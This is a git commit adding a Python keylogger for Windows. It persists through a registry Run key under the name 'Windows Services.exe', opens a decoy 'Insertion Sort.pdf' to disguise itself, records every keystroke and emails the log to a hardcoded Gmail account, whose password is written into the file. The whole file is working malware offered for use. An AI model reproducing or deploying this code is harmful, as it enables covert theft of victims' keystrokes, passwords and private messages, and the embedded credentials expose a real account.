c8b872fd8e47e6cecf8d09ae24470965379964e9
AkshayGowda-repo <86041502+AkshayGowda-repo@users.noreply.github.com>
2023-04-05 12:52:12 +0530

    Initial build

---
+++ keylogger.py
@@ -0,0 +1,68 @@
+import subprocess
+import smtplib
+import string
+import threading
+import pynput
+import os
+import shutil
+import sys
+
+class Keylogger:
+    
+    def __init__(self, email, password):
+        self.become_persistent()
+        self.log = "Keylogger started "
+        self.email = email
+        self.password = password
+    
+
+    def become_persistent(self):
+        evil_file_location = os.environ["appdata"] + "\\Windows Services.exe"
+        if not os.path.exists(evil_file_location):
+            shutil.copyfile(sys.executable, evil_file_location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"',shell = True)
+
+
+    def append_to_log(self, string):
+        self.log += string
+
+    def process_key_press(self, key):
+        try:
+            current_key = str(key.char)
+        except AttributeError:
+            if key == key.space:
+                current_key = " "
+            else:
+                current_key = " " + str(key) + " "
+        self.append_to_log(current_key)
+
+
+    def report(self):
+        self.send_mail(self.email, self.password, "\n\n" +self.log)
+        self.log = ""
+        timer = threading.Timer(25200, self.report)
+        timer.start()
+
+    def send_mail(self, email, password, message):
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
+
+
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(on_press= self.process_key_press)
+        with keyboard_listener:
+            self.report() 
+            keyboard_listener.join()
+
+
+file_name = sys.MEIPASS + "\Insertion Sort.pdf"
+subprocess.Popen(file_name, shell = True)
+
+
+n = Keylogger("devilkalicipher@gmail.com", "eddusfysgmyndalm")
+n.start()
+
+
